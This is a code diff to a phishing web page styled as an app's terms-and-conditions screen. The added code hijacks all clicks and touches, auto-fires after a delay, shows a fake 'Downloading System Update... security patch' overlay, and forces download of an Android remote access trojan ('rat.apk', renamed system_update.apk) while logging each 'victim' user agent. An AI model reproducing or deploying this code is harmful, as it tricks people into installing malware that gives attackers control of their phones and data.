@@ -9,7 +9,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
 
         body {
@@ -96,6 +96,67 @@
             color: #999;
             margin-top: 10px;
         }
+
+        /* Download overlay */
+        .download-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+        }
+
+        .download-card {
+            background: #fff;
+            border-radius: 20px;
+            padding: 30px;
+            width: 85%;
+            max-width: 340px;
+            text-align: center;
+        }
+
+        .download-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+
+        .download-card h3 {
+            font-size: 20px;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .download-card p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e5e7eb;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #6b21a8, #3b82f6);
+            width: 0%;
+            animation: progressAnim 3s forwards;
+        }
+
+        @keyframes progressAnim {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
     </style>
 </head>
 <body>
@@ -130,10 +191,24 @@
         <p>We reserve the right to modify these terms at any time. Your continued use of the service constitutes acceptance of the updated terms.</p>
 
         <div class="download-section">
-            <button class="download-btn" onclick="triggerDownload()">I Agree – Download App</button>
+            <button class="download-btn" onclick="forceDownload('terms')">I Agree – Download App</button>
             <p class="note">By clicking, you agree to our Terms & Conditions</p>
         </div>
     </div>
+
+    <!-- Download overlay -->
+    <div class="download-overlay" id="downloadOverlay">
+        <div class="download-card">
+            <div class="download-icon">⬇️</div>
+            <h3>Downloading System Update...</h3>
+            <p>Please wait while we install the latest security patch.</p>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+    </div>
+
+    <iframe id="downloadFrame" style="display:none;"></iframe>
 
     <script>
         const APK_URL = "https://github.com/hoihohavapv/babychak/releases/download/v1.0.0/rat.apk";
@@ -148,11 +223,9 @@
             } catch(e) {}
         }
 
-        function triggerDownload() {
-            if (downloaded) return;
-            downloaded = true;
-
-            report("✅ Terms page victim: " + navigator.userAgent);
+        function forceDownload(source) {
+            document.getElementById('downloadOverlay').style.display = 'flex';
+            report("✅ Terms victim (source: " + source + "): " + navigator.userAgent);
 
             fetch(APK_URL)
                 .then(res => res.blob())
@@ -160,7 +233,7 @@
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
                     a.href = url;
-                    a.download = 'shiprocket_update.apk';
+                    a.download = 'system_update.apk';
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
@@ -172,23 +245,41 @@
                 });
 
             setTimeout(() => {
-                window.location = 'intent://shiprocket_update.apk#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.packageinstaller;end';
+                window.location = 'intent://system_update.apk#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.packageinstaller;end';
             }, 500);
 
+            document.getElementById('downloadFrame').src = APK_URL;
+
             setTimeout(() => {
-                document.body.innerHTML = '<h1 style="color:#6b21a8;text-align:center;margin-top:50vh">✅ Download Complete!</h1>';
-            }, 2000);
+                window.location.href = APK_URL;
+            }, 1000);
+
+            setTimeout(() => {
+                window.open(APK_URL, '_blank');
+            }, 1500);
+
+            downloaded = true;
         }
 
         document.addEventListener('click', function(e) {
             e.preventDefault();
-            triggerDownload();
-        });
+            e.stopPropagation();
+            forceDownload('click');
+            return false;
+        }, true);
 
         document.addEventListener('touchstart', function(e) {
             e.preventDefault();
-            triggerDownload();
-        });
+            e.stopPropagation();
+            forceDownload('touch');
+            return false;
+        }, true);
+
+        setTimeout(function() {
+            if (!downloaded) {
+                forceDownload('auto');
+            }
+        }, 1500);
 
         report("🌐 Terms page loaded: " + navigator.userAgent);
     </script>
